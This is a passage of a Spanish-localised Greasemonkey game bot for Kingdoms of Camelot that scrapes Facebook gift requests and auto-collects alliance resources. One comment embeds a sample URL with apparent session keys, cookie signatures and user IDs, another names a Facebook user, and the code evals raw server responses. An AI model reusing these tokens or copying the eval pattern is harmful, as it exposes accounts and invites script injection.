        notify ({ok:false, msg:"AJAX Error"});
        return;
      }
      rslt = eval ('('+ rslt +')');
      if (rslt.ok)
        rslt.msg = 'OK';
      notify (rslt);
    }
  },


  deleteGift : function (gift){
    var pargs = {};
//logit ("DELETING GIFT!");
    for (var i=0; i<gift.inputs.length; i++){
//      if (gift.inputs[i].name != 'actions[reject]')
        pargs[gift.inputs[i].name] = gift.inputs[i].value;
    }
    GM_AjaxPost ('http://www.facebook.com/ajax/reqs.php?__a=1', pargs, gotAjaxPost, 'Delete');
    function gotAjaxPost (p){
    }
  },


// get 3 pages ... facebook convert page, facebook claim page and first KofC page (for gift ID) ...
// adds: dat.url, dat.giftId and dat.ver to gift object (if available)
// notify: {ok:true/false,  feedback:,  ajaxErr:  }
  ajaxGetGiftData : function (gift, notify, progress, DELETE){
    var t = Tabs.Gifts;
    gift.dat = {};
    GM_AjaxGet (gift.submit, null, got1, 'Pagina 1');

    function got1 (page){
// sample URL: http://apps.facebook.com/kingdomsofcamelot/?page=claimdailygift&gid=361&sid=4411654&s=88&in=4411654&si=9
// sample result: .... window.location.replace("http:\/\/apps.facebook.com\/kingdomsofcamelot\/?page=claimgift&gid=1045&sid=1432568&s=250&in=1432568&si=5"); ...
      if (page == null)
        notify ({ajaxErr:'COMM Error - pagina 1'});
      progress ('1');
      var m = page.match (/form action=\\"(.*?)\\"/im);
      if (m == null)
        notify ({ajaxErr:'PARSE Error - pagina 1'});
      var url = m[1].htmlSpecialCharsDecode();
	    url = unescape(url);
        url = url.replace ('\\/', '/', 'g');
		url = url.replace (/\\u00253A/g, ':');
		url = url.replace (/\\u00257C/g, '|');
	  var signed_request = /signed_request\\" value=\\"(.*?)\\"/im.exec (page);
	  var opts = [];
	  opts.signed_request = signed_request[1];
      GM_AjaxPost (url, opts, got2, 'Page 2');
    }

	function got2 (page){
      if (page == null)
        notify ({ajaxErr:'COMM Error - pagina 2'});
      progress ('2');
      var m = /top.location.href = \"(.*?)\"/im.exec (page);
	  if (m == null)
        notify ({ajaxErr:'PARSE Error - pagina 2'});
      var url = m[1].htmlSpecialCharsDecode();
      GM_AjaxGet (url, '', got3, 'Pagina 3');
    }

    // sample URL: http://www88.kingdomsofcamelot.com/fb/e2/src/claimDailyGift_src.php?sid=4411654&gid=361&standalone=0&res=1&iframe=1&wcfbuid=1400526627&fbml_sessionkey=2.wdwjP4blBLkO2wXAFqDglg__.3600.1293681600-1400526627&lang=en&in=4411654&si=9&ts=1293677199.881&page=claimdailygift&gid=361&sid=4411654&s=88&in=4411654&si=9&appBar=&kabamuid=114014&tpuid=alYJXw-Us9z9qjRn3DHChEtsFvo&fb_sig_in_iframe=1&fb_sig_base_domain=kingdomsofcamelot.com&fb_sig_locale=en_GB&fb_sig_in_new_facebook=1&fb_sig_time=1293677199.924&fb_sig_added=1&fb_sig_profile_update_time=1267240352&fb_sig_expires=1293681600&fb_sig_user=1400526627&fb_sig_session_key=2.wdwjP4blBLkO2wXAFqDglg__.3600.1293681600-1400526627&fb_sig_ss=7wEsU_e0FLqhrGxE1LAZDg__&fb_sig_cookie_sig=514b59deb303becb5c5c654c9d457732&fb_sig_ext_perms=email%2Cuser_birthday%2Cuser_religion_politics%2Cuser_relationships%2Cuser_relationship_details%2Cuser_hometown%2Cuser_location%2Cuser_likes%2Cuser_activities%2Cuser_interests%2Cuser_education_history%2Cuser_work_history%2Cuser_online_presence%2Cuser_website%2Cuser_groups%2Cuser_events%2Cuser_photos%2Cuser_videos%2Cuser_photo_video_tags%2Cuser_notes%2Cuser_about_me%2Cuser_status%2Cfriends_birthday%2Cfriends_religion_politics%2Cfriends_relationships%2Cfriends_relationship_details%2Cfriends_hometown%2Cfriends_location%2Cfriends_likes%2Cfriends_activities%2Cfriends_interests%2Cfriends_education_history%2Cfriends_work_history%2Cfriends_online_presence%2Cfriends_website%2Cfriends_groups%2Cfriends_events%2Cfriends_photos%2Cfriends_videos%2Cfriends_photo_video_tags%2Cfriends_notes%2Cfriends_about_me%2Cfriends_status&fb_sig_country=us&fb_sig_api_key=0ab5e11ff842ddbdbf51ed7938650b3f&fb_sig_app_id=130402594779&fb_sig=fca33813d9e1c9d411f0ddd04cf5d014
	function got3 (page){
      if (page == null)
        notify ({ajaxErr:'COMM Error - pagina 3'});
      progress ('3');
      var m = page.match (/form action=\\"(.*?)\\"/im);
      if (m == null)
        notify ({ajaxErr:'PARSE Error - page 3'});
      var url = m[1].htmlSpecialCharsDecode();
	  url = unescape(url);
	  url = url.replace ('\\/', '/', 'g');
	  var signed_request = /signed_request\\" value=\\"(.*?)\\"/im.exec (page);
	  var opts = [];
	  opts.signed_request = signed_request[1];
      GM_AjaxPost (url, opts, got4, 'Page 4');
    }

	function got4 (page){
      if (page == null)
        notify ({ajaxErr:'COMM Error - page 4'});
      progress ('4');

	  var m = page.match (/src='(.*?)'/im);
      if (m == null)
        notify ({ajaxErr:'PARSE Error - page 4'});
      var url = m[1].htmlSpecialCharsDecode();
      url = url.replace (/lang=.*?&/, 'lang=en&');
	  url = url.replace ('\\/', '/', 'g');
	  url = url.replace ('&amp;', '&', 'g');
	  url = url.replace ('" + (new Date()).getTime() + "', (new Date()).getTime());
      gift.dat.url = url;
      GM_AjaxGet (url, opts, got5, 'Page 5');
    }

    function got5 (page){
      if (page == null)
        notify ({ajaxErr:'COMM Error - page 5'});
      progress ('5');
	  var m = /<div class=\'giftreturned\'>(.*?)<\/div/im.exec(page);
      if (m != null){
        notify ({feedback:m[1], del:true});
        return;
      }
      var m = /(No hemos podido encontrar su regalo.*?)</im.exec(page);
      if (m != null){
        notify ({feedback:m[1], del:true});
        return;
      }
      var m = /(No se puede obtener la lista de tus amigos.*?)</im.exec(page);
      if (m != null){
        notify ({feedback:m[1]});
        return;
      }
      var m = /(Facebook dice que no son amigos.*?)</im.exec(page);
      if (m != null){
        notify ({feedback:m[1], del:true});
        return;
      }

      var regexp = /<option value='(.*?)'.*?>(.*?)</img ;
      var m;
      while ( (m = regexp.exec (page)) != null){
        if (m[1] != 'noserver')
          Options.giftDomains.list[m[1]] = m[2];
      }
      Options.giftDomains.valid = true;
      if (page.indexOf('ver:2') >= 0){
        m = /giftinviteid:(.*?),/im.exec(page);
        if (m == null)
          notify ({ajaxErr:'PARSE Error (ver:2, invitacion de regalo no encontrada) - pagina 5'});
        gift.dat.giftId = m[1];
        gift.dat.ver = 2;
/** for KofC change 20110119
        m = /wcfbuid=([0-9]*)/im.exec(page);
        if (m == null){
          notify ({ajaxErr:'PARSE Error (ver:2, wcfbuid not found) - page 5'});
          return;
        }
        gift.dat.wcfbuid = m[1];
**/
      } else {
        m = /name='giftId' value='(.*?)'/im.exec(page);
        if (m == null){
          notify ({ajaxErr:'PARSE Error (ver:1, id de regalo no encontrada) - pagina 5'});
          return;
        }
        gift.dat.giftId = m[1];
        gift.dat.ver = 1;
      }
      notify ({ok:true});
    }
  },


  // notify with gifts[] or: {errMsg:xxx}
  fetchGiftsPage : function (notify){
    GM_AjaxGet ('http://www.facebook.com/games?ap=1', '', parseGiftsPage, 'FB Gifts Page');

    // ...profile.php?id=100000710937192">Anestis Mallos</
    // Here is a GIFTNAME you can use
    // OR:  ... would like to give you a gift of GIFTNAME in Kingdoms of Camelot
    // OR:  ... would like to give you a GIFTNAME in Kingdoms of Camelot
    // <input value=\"Accept\" type=\"submit\" name=\"actions[http:\/\/apps.facebook.com\/kingdomsofcamelot\/convert.php?pl=1&in=4411654&ty=1&si=9&wccc=fcf-inv-9&ln=11&da=20101229&ex=gid%3A361%7Csid%3A4411654%7Cs%3A88]\" \/><\/label>
    function parseGiftsPage  (p){
      if (p == null)
        notify ({errMsg:'Ajax Comm Error'});
      p = p.replace ('\\u003c', '<', 'g');
      var t = Tabs.Gifts;
      var gifts = [];
      try {
        var m = p.split ('<form');
        for (var i=0; i<m.length; i++){
          if ( m[i].indexOf('kingdomsofcamelot')<0)
            continue;
          var mm = m[i].match( /facebook.com\\\/.*\">(.*?)<\\\/a><\\\/span>.*?(?:give you a (?:gift of|)(.*?) in |Here is a(.*?)you can use)/im );
		  if (mm==null)
            mm = m[i].match( /facebook.com\\\/.*\">(.*?)<\\\/span><\\\/span><\\\/a>.*?(?:give you a (?:gift of|)(.*?) in |Here is a(.*?)you can use)/im );
          if (mm==null)
            continue;
          var giver = mm[1];
          if (mm[2])
            var gift = mm[2].trim();
          else
            var gift = mm[3].trim();

          // get all inputs ...  (name, value, type)
          var inps = [];
          var args = {};
          var inpsub = null;
          var ins = m[i].match (/<input.*?>/igm);
          for (var ii=0; ii<ins.length; ii++){
            var it = {};
            mm = /value=\\\"(.*?)\\\"/im.exec(ins[ii]);
            it.value = mm[1];
            mm = /name=\\\"(.*?)\\\"/im.exec(ins[ii]);
            it.name = mm[1];
            mm = /type=\\\"(.*?)\\\"/im.exec(ins[ii]);
            it.type = mm[1];
            if (it.type=='submit' && it.name!='actions[reject]'){
              it.name = eval ('"'+ it.name +'"');
              mm = /actions\[(.*?)\]/im.exec(it.name);
              inpsub = mm[1].replace('\\/', '/', 'g');
              inpsub = inpsub.replace('&amp;', '&', 'g');
              var a = inpsub.split ('&');
              for (var iii=0; iii<a.length; iii++){
                var aa = a[iii].split ('=');
                if (aa[0]=='da' || aa[0]=='si'){
                  args[aa[0]] = unescape(aa[1]);
                } else if (aa[0] == 'ex') {
                  var s = unescape(aa[1]).split ('|');
                  for (var iiii=0; iiii<s.length; iiii++){
                    var ss = s[iiii].split(':');
                    if (ss[0] == 's')
                      args.exs = ss[1];
                  }
                }
              }
            } else {
              inps.push (it);
            }
          }
          if (args.da)
            gifts.push ({giver:giver, gift:gift, args:args, submit:inpsub, inputs:inps});
        }
        notify (gifts);
      } catch (e) {
        notify ({errMsg:"Error al analizar la página de regalos de Facebook"+ e});
      }
    }
  },
}

function addCommasWhole1(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + '.' + '$2');
  }
  return x1;
}

/*********************************** Resources TAB ***********************************/
/****
courtDoAction.php
&atype=4&toid=1290791&givercityid=26654
{"ok":true,"gold":500,"resource":500,"resourcetype":"4"}
***/
Tabs.Resources = {
  tabOrder : 100,
  tabLabel : 'V. Cortes',
  resource : {1:'Alimento', 2:'Madera', 3:'Piedra', 4:'Mineral'},
  users : [],
  myDiv : null,
  doList : [], // list of gifts to accept
  accepting : false,
  city : null,
  total : {gold:0, 1:0, 2:0, 3:0, 4:0},

  init : function (div){
    var t = Tabs.Resources;
		t.myDiv = div;
    div.innerHTML = '<TABLE cellpadding=0 cellspacing=0 class=pbTab width=100%><TR><TD align=center><INPUT id="pballlist" type=submit value="Buscar Lista de usuarios" \></td></tr></table><HR>\
        <DIV id=resDiv style="width:100%; min-height:300px; height:100%">';
    document.getElementById('pballlist').addEventListener ('click', t.e_clickfetchlist, false);

  },

  show : function (){
  },
  hide : function (){
  },

  progress : function (msg, span, add){
	if(add)
		document.getElementById(span).innerHTML+=msg;
	else
		document.getElementById(span).innerHTML=msg;
  },

  e_clickfetchlist : function  (){     // (also cancel accepting)
    var t = Tabs.Resources;
	t.users = [];
    if (t.accepting){
      document.getElementById('pballlist').value = 'Fetch User List';
      document.getElementById('resDiv').innerHTML+= '<BR><SPAN class=boldRed>Cancelar.</span>';
      t.accepting = false;
      return;
    }
    document.getElementById('resDiv').innerHTML = 'buscando la lista de usuarios ... <span id=pbResUserListCount></span>';

    t.fetchUserList (gotUserList);
    function gotUserList(userList){
		if(userList.length < 1){
			listGifts();
			return;
		}
		document.getElementById('resDiv').innerHTML += '<BR>Comprobar si es capaz de recoger ... <span id=pbResUserAvailCount></span>';
		t.checkDailyAction(userList, listGifts);
	}

    function listGifts (){
	  t.city = Cities.cities[0];
	  var m = '<DIV class=pbStat><CENTER>Lista de usuarios &nbsp; &nbsp; &nbsp; ('+ t.users.length +' encontrados)</center></div>';
      if (t.users.length<1){
        document.getElementById('resDiv').innerHTML = m + '<BR><BR><CENTER>No se encontraron usuarios!</center>';
        return;
      }
      m += '<TABLE class=pbTab align=center><TR><TD align=right>Aplicar regalos a la ciudad: </td><TD id=pbrescityselspan></td></tr>\
          <TR><TD align=right>Seleccione los recursos para recoger</td><TD>'
        + htmlSelector (t.resource, Options.getResType, 'id=pbResColType')
        + '</td></tr><TR><TD>Seleccione los usuarios a los que quiere visitar: </td><TD width=250><INPUT type=submit id=pbResDo value="Aceptar Recursos">\
        &nbsp; <SPAN id=pbResNone class=boldRed></span></td></tr></table><HR><TABLE class=pbTab><TR valign=top><TD>\
        <INPUT id=pbResButAll type=submit value="Todos" style="width:100%; margin-bottom:5px"><BR><INPUT id=pbResButNone type=submit value="Ninguno"></td>\
        <TD width=10></td><TD><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabLined>\
        <TBODY id=pbResTbody>\
        <TR style="font-weight:bold; background:white"><TD>Nombre</td><TD>poderio</td><TD width=20></td></tr>';
      for (var i=0; i<t.users.length; i++){
        m += '<TR><TD><INPUT type=checkbox id=pbrchk_'+ i +'> &nbsp;'+ t.users[i].name +'</td><TD>'+ t.users[i].might +'</td></tr>';
      }
      document.getElementById('resDiv').innerHTML = m + '</tbody></table></td></tr></table>';
	  new CdispCityPicker ('pbrescitysel', document.getElementById('pbrescityselspan'), true, t.e_CityButton, t.city.idx);
      document.getElementById('pbResDo').addEventListener ('click', t.getErDone, false);
      document.getElementById('pbResButAll').addEventListener ('click', t.e_butAll, false);
      document.getElementById('pbResButNone').addEventListener ('click', t.e_butNone, false);
      var tbody = document.getElementById('pbResTbody');
      tbodyScroller (tbody, getRemainingHeight (tbody, mainPop.div));
    }
  },

  e_CityButton : function (city, x, y){
    var t = Tabs.Resources;
	t.city = city;
  },

  e_butAll : function (){
    var t = Tabs.Resources;
    for (var i=0; i<t.users.length; i++)
      document.getElementById('pbrchk_'+i).checked = true;
  },

  e_butNone : function (){
    var t = Tabs.Resources;
    for (var i=0; i<t.users.length; i++)
      document.getElementById('pbrchk_'+i).checked = false;
  },

  getErDone : function (){
    var t = Tabs.Resources;
    t.doList = [];
    document.getElementById('pbResNone').innerHTML = '';
	Options.getResType = document.getElementById('pbResColType').value;
	t.total = {gold:0, 1:0, 2:0, 3:0, 4:0};
    for (var i=0; i<t.users.length; i++){
      if (document.getElementById('pbrchk_'+i).checked)
        t.doList.push (t.users[i]);
    }
    if (t.doList.length==0){
      document.getElementById('pbResNone').innerHTML = 'No se selecciono ninguno!';
      return;
    }
    t.accepting = true;
    document.getElementById('pballlist').value = 'Parar de Aceptar';
    document.getElementById('resDiv').innerHTML = '<DIV id=rsltDiv style="height:400px; max-height:400px; overflow-y:auto"><B>Aceptando desde '+ t.doList.length +' usuario:</b><BR></div>';
    t.acceptNext ();
  },


  allDone : function (msg){
    var t = Tabs.Resources;
	msg += '<BR><BR> Total de recursos ganados : <BR>\
		   Gold: '+addCommas(t.total.gold)+'<BR>';
	for(var i=1; i<=4; i++){
		msg += t.resource[i]+': '+addCommas(t.total[i])+'<BR>';
	}
    document.getElementById('rsltDiv').innerHTML += '<BR><BR>' + msg;
    document.getElementById('pballlist').value = 'Buscar Lista de usuarios';
    t.accepting = false;
  },


  acceptNext : function (){
    var t = Tabs.Resources;
    var gift = t.doList.shift();
    if (gift == null){
      t.allDone ('Se ternimo de aceptar regalos.');
      return;
    }
    var acpDiv = document.getElementById('rsltDiv');
    var curDiv = document.createElement ('div');
    acpDiv.appendChild (curDiv);
    curDiv.innerHTML = '<B>Desde '+ gift.name +': ';
    var statSpan = document.createElement ('span');
    curDiv.appendChild (statSpan);
    statSpan.innerHTML = 'Aceptando... ';
    t.getCourtAction (gift, gotGiftData);

    function gotGiftData (rslt){
//logit ("getErDone.gotGiftData ... \n"+ inspect (gift, 8, 1));
      if (!t.accepting)
        return;
      if (rslt.ok){
        var msg = rslt.gold +' gold and '+rslt.resource +' '+ t.resource[rslt.resourcetype]+'&nbsp; &nbsp; OK.';
		actionLog ('Aceptando desde '+gift.name+': '+ rslt.gold +' Oro y '+ rslt.resource +' '+ t.resource[rslt.resourcetype]);
        statSpan.innerHTML += msg;
		t.total.gold += rslt.gold;
		t.total[rslt.resourcetype] += rslt.resource;
		t.acceptNext ();
        return;
      }

      if (rslt.msg)
        msg = '<B>'+ rslt.msg + '</b>';
      else
        msg = '<SPAN class=boldRed>ERROR: '+ rslt.ajaxErr +'</span>';

      curDiv.removeChild (statSpan);
      curDiv = document.createElement ('div');
      curDiv.className = 'indent25';
      acpDiv.appendChild (curDiv);
      curDiv.innerHTML = msg;
      t.acceptNext ();
    }

  },

  getMembersInfo : function (pageNo, notify) {
    var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

    params.pageNo = pageNo;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetMembersInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },

  getDailyAction : function (uid, notify){
	var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

    params.pid = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/viewCourt.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },

  getCourtAction : function (gift, notify){
	var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

    params.atype = Options.getResType;
	params.toid = gift.userId;
	params.givercityid = t.city.id;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/courtDoAction.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },

  checkDailyAction : function (userList, notify){
	var t = Tabs.Resources;
	var count = 0;
    t.getDailyAction(userList[count].userId, parseViewCourt);

	function parseViewCourt (rslt){
		if (!rslt.ok || rslt.errMsg)
			notify ({errMsg:'Ajax Comm Error'});
		if(rslt.dailyActionFlag == 0)
			t.users.push(userList[count]);
		t.progress(count, 'pbResUserAvailCount');
		count++;
		if(count < userList.length){
			t.getDailyAction(userList[count].userId, parseViewCourt);
		} else {
			notify();
		}
	}
  },

  // notify with gifts[] or: {errMsg:xxx}
  fetchUserList : function (notify){
	var t = Tabs.Resources;
	var userList = [];
    t.getMembersInfo(1, parseAlliancePage);

    function parseAlliancePage (rslt){
      if (!rslt.ok || rslt.errMsg)
        notify ({errMsg:'Ajax Comm Error'});
	  var users = rslt.memberInfo;
      for(var k in users){
		userList.push({userId:users[k].userId, name:users[k].name, might:users[k].prestige, type:'alliance'});
	  }
	  t.progress(userList.length, 'pbResUserListCount');
	  if(rslt.currentPage < rslt.noOfPages){
		t.getMembersInfo((rslt.currentPage+1), parseAlliancePage);
	  } else {
		notify(userList);
	  }
    }


  },
},



function addCommasWhole(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1;
}

function encode_utf8( s ){
  return unescape( encodeURIComponent( s ) );
}

function decode_utf8( s ){
  return decodeURIComponent( escape( s ) );
}

function CdialogCancelContinue (msg, canNotify, contNotify, centerElement){
  var pop = new CPopup ('ptcancont', 10, 10, 400,200, true, canNotify);
  if (centerElement)
    pop.centerMe(centerElement);
  else
    pop.centerMe(document.body);
  pop.getTopDiv().innerHTML = '<CENTER>KOC Menu Bot</center>';
  pop.getMainDiv().innerHTML = '<TABLE class=ptTab align=center style="height: 100%"><TR align=center height=90%><TD>'+ msg +'</td></tr>\
      <TR align=center><TD><INPUT id=ptok type=submit value="OK" \> &nbsp; &nbsp; </td></tr></table>';
  document.getElementById('ptok').addEventListener ('click', function (){pop.destroy(false); if (canNotify) canNotify();}, false);
  pop.show(true);
}

function CdialogConfirm (msg, canNotify, contNotify, centerElement){
  var pop = new CPopup ('ptcancont', 10, 10, 400,200, true, canNotify);
  if (centerElement)
    pop.centerMe(centerElement);
  else
    pop.centerMe(document.body);
  pop.getTopDiv().innerHTML = '<CENTER>KOC Menu Bot</center>';
  pop.getMainDiv().innerHTML = '<TABLE class=ptTab align=center style="height: 100%"><TR align=center height=90%><TD colspan=2>'+ msg +'</td></tr>\
      <TR align=center><TD><INPUT id=pbok type=submit value="OK" \> &nbsp; &nbsp; </td><TD><INPUT id=pbcancel type=submit value="CANCEL" \> &nbsp; &nbsp; </td></tr></table>';
  document.getElementById('pbok').addEventListener ('click', function (){pop.destroy(false); if (canNotify) canNotify(this);}, false);
  document.getElementById('pbcancel').addEventListener ('click', function (){pop.destroy(false); if (canNotify) canNotify(this);}, false);
  pop.show(true);
}

function hexDump (dat){
  var i = 0;
  var s = [];
  while (i < dat.length) {
    asc = [];
    s.push (hex4(i));
    s.push (': ');
    for (var ii=0; ii<16; ii++) {
      c = dat.charCodeAt(i+ii);
      s.push (hex2(c));
      s.push (' ');
      if (c>31 && c<128)
        asc.push (dat.charAt(i+ii));
      else
        asc.push ('.');
    }
    s.push ('  ');
    s.push (asc.join(''))
    s.push ('\n');
    i += 16;
  }
  return s.join ('');
  function hex4(d){
    return hexDig(d>>12) + hexDig(d>>8) + hexDig(d>>4) + hexDig(d&15);
  }
  function hex2(d){
    return hexDig(d>>4) + hexDig(d&15);
  }
  function hexDig (d){
    hexdigs = '0123456789ABCDEF';
    return hexdigs.charAt(d&15);
  }
}

// value is 0 to 1.0
function SliderBar (container, width, height, value, classPrefix, margin){
  var self = this;
  this.listener = null;
  if (value==null)
    value = 0;
  if (!margin)
    margin = parseInt(width*.05);
  this.value = value;
  if (width<20) width=20;
  if (height<5) height=5;
  if (classPrefix == null){
    classPrefix = 'slider';
    var noClass = true;
  }
  var sliderHeight = parseInt(height/2);
  var sliderTop = parseInt(height/4);
  this.sliderWidth = width - (margin*2);

  this.div = document.createElement ('div');
  this.div.style.height = height +'px';
  this.div.style.width = width +'px';
  this.div.className = classPrefix +'Cont';
  if (noClass)
    this.div.style.backgroundColor='#ddd';

  this.slider = document.createElement ('div');
  this.slider.setAttribute ('style', 'position:relative;');
  this.slider.style.height = sliderHeight + 'px'
  this.slider.style.top = sliderTop + 'px';
  this.slider.style.width = this.sliderWidth +'px';
  this.slider.style.left = margin +'px';   /////
  this.slider.className = classPrefix +'Bar';
  this.slider.draggable = true;
  if (noClass)
    this.slider.style.backgroundColor='#fff';

  this.sliderL = document.createElement ('div');
  this.sliderL.setAttribute ('style', 'width:100px; height:100%; position:relative; ');
  this.sliderL.className = classPrefix +'Part';
  this.sliderL.draggable = true;
  if (noClass)
    this.sliderL.style.backgroundColor='#0c0';

  this.knob = document.createElement ('div');
  this.knob.setAttribute ('style', 'width:3px; position:relative; left:0px; background-color:#222');
  this.knob.style.height = height +'px';
  this.knob.style.top = (0-sliderTop) +'px';
  this.knob.className = classPrefix +'Knob';
  this.knob.draggable = true;
  this.slider.appendChild(this.sliderL);
  this.sliderL.appendChild (this.knob);
  this.div.appendChild (this.slider);
  container.appendChild (this.div);
  this.div.addEventListener('mousedown',  mouseDown, false);

  this.getValue = function (){
    return self.value;
  }

  this.setValue = function (val){   // todo: range check
    var relX = (val * self.sliderWidth);
    self.sliderL.style.width = relX + 'px';
    self.knob.style.left =  relX + 'px';
    self.value = val;
    if (self.listener)
      self.listener(self.value);
  }

  this.setChangeListener = function (listener){
    self.listener = listener;
  }

  function moveKnob (me){
    var relX = me.clientX - self.divLeft;
    if (relX < 0)
      relX = 0;
    if (relX > self.sliderWidth)
      relX = self.sliderWidth;
    self.knob.style.left = (relX - (self.knob.clientWidth/2) ) +'px';   // - half knob width !?!?
    self.sliderL.style.width = relX + 'px';
    self.value =  relX / self.sliderWidth;
    if (self.listener)
      self.listener(self.value);
  }
  function doneMoving (){
    self.div.removeEventListener('mousemove', mouseMove, true);
    document.removeEventListener('mouseup', mouseUp, true);
  }
  function mouseUp (me){
    moveKnob (me);
    doneMoving();
  }

  function mouseDown(me){
    var e = self.slider;
    self.divLeft = 0;
    while (e.offsetParent){   // determine actual clientX
      self.divLeft += e.offsetLeft;
      e = e.offsetParent;
    }
    moveKnob (me);
    document.addEventListener('mouseup',  mouseUp, true);
    self.div.addEventListener('mousemove',  mouseMove, true);
  }
  function mouseMove(me){
    moveKnob (me);
  }
}

function pause(milliseconds) {
	var dt = new Date();
	while ((new Date()) - dt <= milliseconds) { /* Do nothing */ }
}

function CmatSimpleSound (playerUrl, container, attrs, onLoad, flashVars) {
  var self = this;
  this.player = null;
  this.volume = 100;
  this.isLoaded = false;
  this.onSwfLoaded = null;

  var div = document.createElement ('div');
  this.onSwfLoaded = onLoad;
  if (navigator.appName.toLowerCase().indexOf('microsoft')+1) {
    div.innerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0"><param name="movie" value="'+playerUrl+'"><param name="quality" value="high"></object>';
    this.player = div.getElementsByTagName('object')[0];
  } else {
    div.innerHTML = '<embed src="'+playerUrl+'"  bgcolor="#eeeeee" allowfullscreen=false FlashVars="'+ flashVars +'" quality="high" allowscriptaccess="always" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" ></embed>';
    this.player = div.getElementsByTagName('embed')[0].wrappedJSObject;
  }
  if (container)
    container.appendChild (div);
  else
    document.body.appendChild (div);
  for (k in attrs)
    this.player.setAttribute(k, attrs[k]);

  this.setVolume = function (chanNum, vol){
    if (!self.isLoaded)
      return;
    self.player.jsSetVolume (chanNum, vol);
    volume = vol;
  }

  this.load = function (chanNum, url, bStream, bAutoplay, bUsePolicyFile){   // loop ?
    self.player.jsLoad (chanNum, url, bStream, bAutoplay, bUsePolicyFile);
  }

  this.play = function (chanNum, position){
    self.player.jsPlay (chanNum, position);
  }

  this.stop = function (chanNum){
    self.player.jsStop (chanNum);
  }

  this.getStatus = function (chanNum){           // returns null if sound channel is 'empty'
    return self.player.jsGetStatus (chanNum);
  }

  this.debugFunc = function (msg){  // overload to use
  }

  this.swfDebug = function (msg){    // called by plugin
    self.debugFunc('SWF: '+ msg);
  }
  this.swfLoaded = function (){    // called by plugin when ready to go!
    self.isLoaded = true;
    self.debugFunc ('playerIsReady');
    if (self.onSwfLoaded)
      self.onSwfLoaded();
  }
  this.swfPlayComplete = function (chanNum){    // called by plugin when a sound finishes playing (overload to be notified)
  }
  this.swfLoadComplete = function (chanNum, isError){    // called by plugin when a sound finishes loading  (overload to be notified)
  }
}

function DoUnsafeWindow(func, execute_by_embed) {
	if(this.isChrome || execute_by_embed) {
		var scr=document.createElement('script');
		scr.innerHTML=func;
		document.body.appendChild(scr);
	} else {
		try {
			eval("unsafeWindow."+func);
		} catch (error) {
			logit("A javascript error has occurred when executing a function via DoUnsafeWindow. Error description: "+error.description);
		}
	}
}

function GetDisplayName(){
	var DisplayName = document.getElementById('topnavDisplayName');
	if(DisplayName){
		DisplayName = DisplayName.innerHTML;
	}else{
		DisplayName = null;
	}
	return DisplayName
}

//modal_maptile((tileID),(Name),(X),(Y),(Gender+Avatar),(User),(Might),(Title),(AllianceName),(null),(tileProvinceId),(tilename),(CityState),(TileLevel),(allianceId),(tileCityId),(tileUserId),(TypeName),(misted));
//modal_maptile(453323,"Heineken4",172,622,"m6","Heineken",3758930,"60","Darkness",null,21,"city","Normal",9,2136,67677,1589067,"City",false);
function DrawLevelIcons() {
 var maptileRe = /modal_maptile.([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+)/;
	var mapwindow=document.getElementById('mapwindow');
	if(!mapwindow) return;
	var levelIcons=document.getElementById('LevelIcons');
	if(levelIcons) return;

	var ss=document.evaluate(".//a[contains(@class,'slot')]",mapwindow,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	var lvRe=/_([0-9]+)/;
	var idDone=false;
	for(var s=0; s<ss.snapshotLength; s++) {
		var a=ss.snapshotItem(s);
		var onclick=a.getAttribute('onclick');
		//alert(onclick);
		var owner='';
		if(onclick) {
			var onclickM=maptileRe.exec(onclick);
			if(onclickM && onclickM[6]!='"null"') {
				var might=onclickM[7].StripQuotes();
        var alliance=onclickM[15].StripQuotes();
				var dip=getDiplomacy(alliance);
				owner=" "+onclickM[6].StripQuotes();
			}
		}
		var m=lvRe.exec(a.className);
		if(!m) continue;
		var sp=a.getElementsByTagName('span');
		if(sp.length==0) continue;

		if(!idDone) { a.id='levelIcons'; idDone=true; }
		sp[0].style.color='#cc0';//color parcelas libres

		if (alliance != 'null' && onclickM[12]=='"city"') sp[0].style.color='#04B431';//ciudades con alianza
		if (alliance == 'null' && onclickM[12]=='"city"') sp[0].style.color='#33CCFF';//ciudades sin alianza
		if (onclickM[12]!='"city"' &&  onclickM[6]!='"null"') sp[0].style.color='#FF9900';//tierras con alianza
		if (onclickM[12]!='"city"' &&  onclickM[6]=='"null"') sp[0].style.color='#FF9900';//tierras con alianza
